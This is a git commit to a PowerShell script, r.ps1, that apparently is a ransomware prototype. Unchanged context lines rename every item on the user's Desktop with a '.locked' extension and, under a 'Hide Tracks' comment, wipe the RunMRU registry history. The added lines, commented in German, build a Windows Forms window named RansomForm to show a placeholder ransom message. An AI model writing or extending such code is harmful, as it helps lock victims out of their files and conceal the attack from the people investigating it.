897371a48e44e819f9a6624723b93171a5b1eb5d
Marco <marcospies2000@gmail.com>
2024-12-17 14:57:39 +0100

    window test

--- r.ps1
+++ r.ps1
@@ -30,3 +30,27 @@ Get-ChildItem $HOME\Desktop\* | Rename-Item -NewName {$_.name + ".locked"}
 
 # Hide Tracks
 Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue
+
+
+# Füge die Windows Forms Assembly hinzu
+Add-Type -AssemblyName 'System.Windows.Forms'
+
+# Erstelle ein neues Formular-Objekt
+$FormObject = [System.Windows.Forms.Form]
+$RansomForm = New-Object $FormObject
+
+# Setze die Größe des Formulars
+$RansomForm.ClientSize = '700,400'
+
+# Erstelle ein Label und füge es dem Formular hinzu
+$LabelObject = [System.Windows.Forms.Label]
+$Label = New-Object $LabelObject
+$Label.Text = 'Some text...'
+$Label.AutoSize = $true
+$Label.Location = '200,150'
+
+# Füge das Label dem Formular hinzu
+$RansomForm.Controls.Add($Label)
+
+# Zeige das Formular an
+$RansomForm.ShowDialog()
